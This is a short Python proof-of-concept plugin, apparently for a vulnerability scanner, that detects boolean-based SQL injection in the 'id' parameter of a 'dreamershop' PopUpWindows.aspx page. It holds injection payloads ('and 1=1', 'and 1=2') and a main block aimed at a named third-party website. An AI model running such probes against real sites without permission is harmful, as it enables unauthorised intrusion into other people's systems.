#!/usr/bin/env python
# -*- coding: utf-8 -*-
# author: DB522
# refer: http://www.wooyun.org/bugs/wooyun-2015-0121914
def assign(service, arg):
    if service == "dreamershop":
	return True, arg

def audit(arg):
    payload = ['PopUpWindows.aspx?id=1','PopUpWindows.aspx?id=1%20and%201=1','PopUpWindows.aspx?id=1%20and%201=2']
    url = arg + payload[0]
    url1 = arg + payload[1]
    url2 = arg + payload[2]
    code, head, res, errcode, final_url = curl.curl2(url)
    code1, head1, res1, errcode1, final_url1 = curl.curl2(url1)
    code2, head2, res2, errcode2, final_url2 = curl.curl2(url2)
    if code==200 and code1==200 and code2==200 and res==res1 and res!=res2:
        security_hole(url + ' :found SQL Injection')

if __name__ == '__main__':
    from dummy import *
    audit(assign('dreamershop', 'http://www.fujian17.com/')[1])